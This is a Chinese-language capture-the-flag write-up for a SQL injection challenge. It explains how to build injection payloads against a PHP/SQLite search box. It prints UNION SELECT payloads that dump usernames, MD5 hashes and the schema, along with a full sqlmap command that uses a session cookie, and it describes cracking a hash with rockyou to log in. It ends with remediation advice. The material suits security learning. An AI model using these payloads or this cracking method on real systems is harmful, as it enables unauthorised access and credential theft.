# SqlMap1 — Writeup（重點:偵查思路 + 怎麼寫注入）
 
> 賽事：CyLab Academy（picoCTF 2026 風格）
> 類別：**Web Exploitation**（SQL Injection + sqlmap + 認證邏輯）
> Flag：`academy{F0uNd_s3cr3T_K3y_f0R_w3_...}`（提交前用 Ctrl+U 看原始碼確認 `<>` 裡的字元）
 
---
 
## 這篇的重點
 
不是「payload 長怎樣」，而是兩件更重要的事：
1. **怎麼寫出正確的注入 payload**（為什麼自己打會報錯）
2. **怎麼從每一步的回應「收集情資」決定下一步**（迭代偵查迴圈）
---
 
## 0. 怎麼寫 SQL injection payload（先搞懂這個）
 
### 核心觀念：你是在「補完」伺服器寫到一半的 SQL
 
伺服器的查詢（這題）：
```sql
SELECT key, value FROM flags WHERE key LIKE '%【你的輸入】%'
```
 
你的輸入掉進 `'%...%'` 裡。所以你要做三件事：
1. **閉合字串**：開頭用 `'` 關掉伺服器的引號
2. **注入你的 SQL**：`UNION SELECT ...`
3. **處理尾巴**：用 `-- `（減減加**空格**）把後面剩下的 `%'` 註解掉，讓整句合法
### 為什麼「自己打會報錯、複製別人的就行」
 
報錯 = **拼出來的 SQL 語法壞了**。最常見三個原因：
 
| 錯誤原因 | 症狀 | 修法 |
|---------|------|------|
| 引號沒閉合 | syntax error near... | 開頭先補 `'` |
| `--` 後沒空格 | 註解無效、尾巴 `%'` 還在 | 寫成 `-- `（有空格） |
| UNION 欄位數不符 | "SELECTs ... do not have the same number of result columns" | 左右欄位數要一樣 |
| 智慧引號 | 複製貼上變成 `'` 而非 `'` | 用純文字的直引號 `'` |
 
### 重點心法：報錯不是失敗，是 Oracle
 
SQLi 是**迭代**出來的，不是一次寫對：
```
送 payload → 報錯 → 讀錯誤（它告訴你哪裡沒閉合）→ 調整 → 再送
```
「一次就對」的人，是因為**先從錯誤訊息把 SQL 結構推出來了**，才寫得準。你也可以——先送一個 `'` 看它噴什麼，就知道結構。
 
---
 
## 1. 偵查思路：迭代情資迴圈（這題最值得學的）
 
每一步的回應都抽出一條情報，指向下一步。這就是「怎麼知道下一步」的答案。
 
| 探針（我送什麼） | 情報（我抽到什麼） | 下一步 |
|-----------------|-------------------|--------|
| 搜尋框打 `'` | 噴 `SQLite3::query()` 錯誤 → **後端 SQLite + 可注入 + PHP** | 找欄位數 |
| `' UNION SELECT 1,2-- ` | 顯示 `1: 2` → **查詢回 2 欄，兩欄都顯示** | 撈資料表 |
| `' UNION SELECT username, password FROM users-- ` | 一排 32 位十六進位 → **users 表 + MD5** | 確認雜湊方式 |
| 自己註冊 `aaa`，看雜湊 | `md5('aaa')` 吻合 → **純 MD5 無 salt** | 丟 rockyou 破 |
| `' UNION SELECT name, sql FROM sqlite_master-- ` | 只有 flags+users 兩表，flags 全誘餌 | 推論：flag 不在 DB |
| sqlmap `--dump -T flags` | blind 挖出 10 筆全假 | 推論：flag 在程式碼 |
| 看 key 裡的使用者名 | malicious/noaccess/suspicious 是壞人名，ctf-player 是 legit | 登入成 ctf-player |
 
> **核心：不是一次想到終點，是每一步的結果把你推向下一步。** 送探針 → 讀回應 → 抽情報 → 縮小範圍 → 下一個探針。
 
---
 
## 2. 完整解題步驟
 
### Step 1：確認注入 + 認出後端
搜尋框打 `'` → 噴錯：
```
SQLite3::query(): ... SELECTs to the left and right of UNION
do not have the same number of result columns
```
→ **SQLite**（不是 MySQL/PG，語法不同要注意）、可注入、PHP。
 
### Step 2：找欄位數
```
' UNION SELECT 1,2-- 
```
顯示 `1: 2` → **2 欄，都會顯示**。（不夠就 `1,2,3` 一直加。）
 
### Step 3：撈 users 表
```
' UNION SELECT username, password FROM users-- 
```
拿到 7 個使用者 + MD5 雜湊。
 
### Step 4：確認雜湊方式 + 破解
自己註冊 `aaa`/`aaa`，密碼存成 `47bce5c74f589f4867dbd57e9ca9f808`；`md5("aaa")` 完全吻合 → **純 MD5（legacy）**。
丟 rockyou → 破出 **`ctf-player` = `dyesebel`**（其他使用者密碼不在字典）。
 
### Step 5：確認 flag 不在資料庫
```
' UNION SELECT name, sql FROM sqlite_master-- 
```
資料庫只有 `flags(id,key,value)` 和 `users(id,username,password)`。flags 10 筆**全是英文嘲諷的假 flag**（`n0T_fl@G`=this is not flag、`n0T_F0uNd`=not found…）。
→ **真 flag 不在資料表，一定在 vuln.php 的程式邏輯裡。**
 
### Step 6：用 sqlmap 確認（blind injection）
手動 UNION 只能看到「頁面顯示的東西」。sqlmap 用 **blind injection**（一個字元一個字元問 true/false），**繞過顯示層**把資料直接「問」出來：
```
sqlmap -u "http://TARGET:PORT/vuln.php?q=test" --cookie="PHPSESSID=你的session" -p q --dbms=sqlite --batch --dump -T flags
```
確認 flags 表就是 10 筆誘餌，連隱藏的都沒有。
 
> **sqlmap 踩雷備忘**：
> - Windows cmd **不能用 `\` 換行**，整串寫**一行**
> - `--cookie` 要帶**有效的登入 PHPSESSID**，不然 302 踢回登入頁、測不到注入
> - 已知後端就加 `--dbms=sqlite` 跑更快
 
### Step 7：「act as a legit user」——登入成 ctf-player
看 flags 的 key 含使用者名：
```
malicious / noaccess / suspicious  → 名字就說它們是「壞人」❌
ctf-player                          → 唯一的「合法使用者」✅
```
題目反覆說 "act as a legit user" → 目標就是 **ctf-player**，而我們破出了它的密碼。
 
**登出 → 用 ctf-player / dyesebel 正常登入 → 搜尋 → 真 flag 出現！**
 
---
 
## 3. 背後機制：為什麼「登入」才看得到真 flag
 
vuln.php 大概這樣寫：
```php
if ($_SESSION['username'] == $row['key']) {
    echo 真flag;         // 你本人 → 給真的
} else {
    echo $row['value'];  // 別人 → 給假的（你注入時看到的誘餌）
}
```
 
- 你**注入**時是 `aaa` → 比對不成立 → 看到 ctf-player 的**誘餌**
- 你**真的登入成 ctf-player** → `session == key` 成立 → 吐**真 flag**
這就是為什麼**不能用注入拿到**，必須「真的成為合法使用者」——破密碼登入正好做到。
 
> flag 裡的 `<>`：因為 vuln.php 用 `htmlspecialchars` 輸出，flag 裡的 `<...>` 在瀏覽器可能被當標籤吃掉。提交前按 **Ctrl+U** 看原始碼確認完整字元。
 
---
 
## 4. 修復建議
 
- **所有 SQL 參數化**（`?`/prepared statement），不要字串拼接
- **別用 MD5 存密碼**，用 bcrypt/argon2 + salt
- 錯誤訊息不要直接吐給使用者（它洩漏了 SQLite、表結構）
- 權限邏輯別靠「比對 session == key 才給真值」這種 sloppy 寫法
---
 
## 5. 帶走的心法
 
| 心法 | 這題怎麼用 |
|------|-----------|
| **迭代情資迴圈** | 每一步的回應抽一條情報 → 決定下一個探針 |
| **Errors are Oracles** | 報錯告訴你 SQL 結構/哪裡沒閉合；先送 `'` 探結構 |
| **payload = 補完伺服器的 SQL** | 閉合引號 → 注入 → `-- ` 註解尾巴 |
| **blind injection 繞過顯示層** | 頁面藏得住的，sqlmap 問得出來 |
| **讀懂「贏的條件」** | flag 不在 DB → 在程式碼 → 綁定身分 → 成為合法使用者 |
| **名字就是線索** | malicious/noaccess 是壞人，ctf-player 是 legit |
 
> **最核心：payload 怎麼寫是小事，「怎麼知道下一步」才是真功夫——靠一步步收集情資逼出來。**
 
---
 
*授權用途：CTF 學習 / 授權滲透測試 / 自己的機器。*
 
